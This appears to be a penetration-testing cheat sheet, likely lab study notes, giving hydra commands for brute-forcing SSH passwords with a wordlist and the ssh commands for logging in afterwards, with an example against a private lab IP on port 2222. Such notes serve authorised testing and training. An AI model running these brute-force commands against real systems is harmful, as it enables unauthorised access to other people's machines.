# SSH Password Attack

```bash
hydra -l <username> -P <wordlist> -s <port> ssh://<target-ip>

# Using a username file:

hydra -L <userfile> -P <wordlist> -s <port> ssh://<target-ip>

# For standard port 22 you can just drop the -s flag entirely:

hydra -l <username> -P <wordlist> ssh://<target-ip>

# Non Standard Port Example:
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.183.201
```
![alt text](image.png)

## Login with credentials

```bash
ssh -p <port> <username>@<target-ip>
# or
ssh <username>@<target-ip>

# If you have a SSH Key
ssh -p <port> -i <SSH_FILENAME> <username>@<target-ip>
#or
ssh -i <SSH_FILENAME> <username>@<target-ip>

#Example
ssh -p 2222 george@192.168.183.201
```
